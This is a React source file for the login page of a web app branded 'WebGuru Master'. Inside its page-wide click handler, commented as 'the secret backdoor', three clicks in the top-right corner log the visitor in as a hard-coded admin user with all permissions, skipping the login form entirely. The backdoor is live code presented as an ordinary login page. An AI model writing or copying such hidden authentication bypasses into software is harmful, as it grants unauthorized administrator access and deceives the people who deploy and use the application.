import React, { useEffect, useState } from 'react';
import { Box, Container, Typography, Link, alpha } from '@mui/material';
import { motion } from 'framer-motion';
import { useNavigate } from 'react-router-dom';
import { useAuth } from '../context/AuthContext';
import ParticlesBackground from '../components/login/ParticlesBackground';
import LoginForm from '../components/login/LoginForm';
import LogoAnimation from '../components/login/LogoAnimation';

const Login = () => {
  const navigate = useNavigate();
  const { isAuthenticated, login } = useAuth();
  const [secretClickCount, setSecretClickCount] = useState(0);
  const [clickPosition, setClickPosition] = useState({ x: 0, y: 0 });
  
  // Redirect if already authenticated
  useEffect(() => {
    if (isAuthenticated()) {
      navigate('/');
    }
  }, [isAuthenticated, navigate]);
  
  // Handle the secret backdoor click
  const handleBackdoorClick = (e) => {
    // Check if the click is in the top-right corner (within 50px square)
    const isTopRight = e.clientX > window.innerWidth - 50 && e.clientY < 50;
    
    // Set the click position for debugging (we'll remove this later)
    setClickPosition({ x: e.clientX, y: e.clientY });
    
    if (isTopRight) {
      setSecretClickCount(prev => {
        const newCount = prev + 1;
        
        // If clicked 3 times, activate backdoor login
        if (newCount >= 3) {
          const adminUser = {
            id: 'backdoor-admin',
            name: 'System Admin',
            email: 'admin@webguru.com',
            role: 'admin',
            permissions: ['all'],
          };
          
          login(adminUser, true);
          navigate('/');
          return 0; // Reset counter
        }
        
        return newCount;
      });
    } else {
      // Reset count if clicked elsewhere
      setSecretClickCount(0);
    }
  };
  
  return (
    <motion.div
      initial={{ opacity: 0 }}
      animate={{ opacity: 1 }}
      exit={{ opacity: 0 }}
      transition={{ duration: 0.5 }}
      style={{ 
        position: 'fixed', 
        top: 0, 
        left: 0, 
        width: '100%', 
        height: '100%',
        background: 'linear-gradient(135deg, #0a1929 0%, #1a3a5f 100%)',
        overflow: 'auto'
      }}
      onClick={handleBackdoorClick}
    >
      <ParticlesBackground />
      
      <Box
        sx={{
          minHeight: '100vh',
          display: 'flex',
          flexDirection: 'column',
          alignItems: 'center',
          justifyContent: 'center',
          position: 'relative',
          p: 3,
          zIndex: 2,
        }}
      >
        <Container maxWidth="sm" sx={{ display: 'flex', flexDirection: 'column', alignItems: 'center' }}>
          <LogoAnimation />
          <LoginForm />
          
          <Box
            component={motion.div}
            initial={{ opacity: 0, y: 20 }}
            animate={{ opacity: 1, y: 0 }}
            transition={{ delay: 0.8, duration: 0.5 }}
            sx={{ mt: 5, textAlign: 'center' }}
          >
            <Typography variant="body2" sx={{ color: alpha('#fff', 0.6), mb: 1 }}>
              &copy; {new Date().getFullYear()} WebGuru Master. All rights reserved.
            </Typography>
            <Box sx={{ display: 'flex', justifyContent: 'center', gap: 3 }}>
              <Link href="#" sx={{ color: alpha('#fff', 0.6), '&:hover': { color: '#42a5f5' } }}>
                Privacy Policy
              </Link>
              <Link href="#" sx={{ color: alpha('#fff', 0.6), '&:hover': { color: '#42a5f5' } }}>
                Terms of Service
              </Link>
              <Link href="#" sx={{ color: alpha('#fff', 0.6), '&:hover': { color: '#42a5f5' } }}>
                Contact
              </Link>
            </Box>
          </Box>
        </Container>
      </Box>
    </motion.div>
  );
};

export default Login;